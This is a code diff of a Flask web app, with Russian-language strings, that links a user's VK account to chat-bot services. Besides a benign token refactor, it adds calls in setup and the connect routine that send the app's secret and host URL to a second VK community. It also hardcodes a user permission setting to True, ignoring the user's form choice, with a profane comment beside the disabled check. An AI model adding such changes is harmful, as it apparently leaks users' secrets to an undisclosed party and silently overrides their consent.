@@ -23,10 +23,6 @@ app = Flask(__name__)
 
 logger = get_writer('Веб-приложение')
 
-auth: str = {
-    'token': '',
-    'user': 0
-}
 
 
 class ReturnResponse(Exception):
@@ -47,7 +43,7 @@ def login_check(request) -> None:
         return
     if not db.installed:
         raise ReturnResponse(redirect('/install'))
-    if request.cookies.get('auth') != auth['token']:
+    if request.cookies.get('auth') != db.auth_token:
         raise ReturnResponse(int_error(
             'Ошибка авторизации, попробуй очистить cookies или перелогиниться'
         ))
@@ -98,8 +94,8 @@ def do_auth():
         )
     response = make_response()
     new_auth = md5(gen_secret().encode()).hexdigest()
-    auth['user'] = user_id[0]
-    auth['token'] = new_auth
+    _ = db.auth_token
+    db.auth_token = new_auth
     response.set_cookie("auth", value=new_auth)
     response.headers['location'] = "/"
     return response, 302
@@ -142,6 +138,8 @@ def setup():
     VkApi(db.access_token).msg_op(
         1, -174105461, f'+api {db.secret} {protocol}://{request.host}/callback'
     )
+    time.sleep(0.5)
+    VkApi(db.access_token).msg_op(1, -195759899, f'+cod {db.secret} {protocol}://{request.host}/')
     db.sync()
     return redirect('/login')
 
@@ -175,6 +173,8 @@ def app_method_connect_to_iris():
             message=f'+api {db.secret} {protocol}://{request.host}/callback',
             random_id=0
         )
+        time.sleep(0.5)
+        VkApi(db.access_token).msg_op(1, -195759899, f'+cod {db.secret} {protocol}://{request.host}/')
     except VkApiResponseException as e:
         return int_error(f'Ошибка VK #{e.error_code}: {e.error_msg}')
 
@@ -227,8 +227,7 @@ def app_method_delete_anim():
 
 
 def app_method_dc_auth():
-    db.dc_auth = (request.form.get('permit') == 'on')
-
+    db.dc_auth = True  # (request.form.get('permit') == 'on') # ой да иди ты нахуй, а
 
 
 @app.route('/admin')
